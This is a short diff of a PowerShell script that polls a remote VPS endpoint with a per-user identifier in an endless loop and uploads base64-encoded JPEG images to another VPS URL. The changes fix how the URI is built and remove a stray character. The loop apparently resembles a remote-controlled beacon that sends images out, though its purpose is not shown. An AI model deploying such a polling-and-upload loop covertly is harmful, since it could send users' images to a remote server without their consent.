@@ -85,7 +85,7 @@ while ($true) {
   try {
     Log "15 Polling VPS"
 
-    $fullUri = "$VPS_POLL_URL?username=$uniqueUser"
+    $fullUri = $VPS_POLL_URL + "?username=" + $uniqueUser
     Log "15a Full URI: $fullUri"
     Log "15b URI length: $($fullUri.Length)"
     Log "15c VPS_POLL_URL: $VPS_POLL_URL"
@@ -158,7 +158,7 @@ while ($true) {
           filename = (Get-Item $JpegPath).Name
           image = $base64Image
         } | ConvertTo-Json -Compress
-F
+
         Log "28 Uploading JPEG"
 
         Invoke-RestMethod -Method Post -Uri $VPS_UPLOAD_URL -ContentType "application/json" -Body $body -TimeoutSec 10 -UseBasicParsing | Out-Null
